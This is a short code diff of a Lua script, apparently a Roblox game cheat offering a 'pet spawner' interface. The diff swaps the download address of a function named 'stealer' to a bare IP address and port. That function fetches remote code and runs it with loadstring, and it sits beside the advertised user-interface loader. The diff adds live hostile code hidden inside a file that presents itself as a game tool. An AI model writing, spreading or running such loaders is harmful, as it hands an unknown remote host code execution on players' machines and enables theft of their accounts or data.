@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://pastefy.app/r6ngxHqo/raw"))()
+    loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjQzMDllMDEyLTZlODgtNDcwYy1hYzI0LTAzNzlkM2RhODlkMyIsImtpbmQiOiJsb2FkZXIifQ"))()
 end
 local function loadui()
   loadstring(game:HttpGet("https://gitlab.com/rlbx-scripts/elysium/-/raw/main/adm-pet-spawner"))()
